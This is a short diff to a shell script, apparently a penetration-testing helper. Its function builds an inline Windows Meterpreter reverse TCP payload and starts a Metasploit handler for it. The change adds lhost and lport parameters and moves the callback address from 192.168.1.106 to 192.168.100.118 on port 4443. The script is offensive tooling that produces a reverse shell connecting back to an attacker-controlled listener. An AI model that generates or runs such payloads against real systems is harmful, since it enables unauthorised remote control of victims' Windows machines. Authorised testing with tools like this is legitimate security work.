@@ -1,6 +1,8 @@
 winmetrev_tcp_inline() {
   # Makes an Inline Windows Meterpreter Reverse Payload
   # enables UUID Tracking (whitelisting) for payloads, ignores the rest
+  lhost=$1
+  lport=$2
   setpayvars() {
     d_payload="-p windows/meterpreter_reverse_tcp"
     d_lhost="set lhost=$lhost"
@@ -57,4 +59,4 @@ winmetrev_tcp_inline() {
   rcgen
   (makeXtermLog "Meterpreter_Handler_WinMetRev_TCP_Inline" "$msfc -r $msfs/inline_winmetrev_tcp_inline_handler.rc") &
 }
-winmetrev_tcp_inline 192.168.1.106 4443
+winmetrev_tcp_inline 192.168.100.118 4443
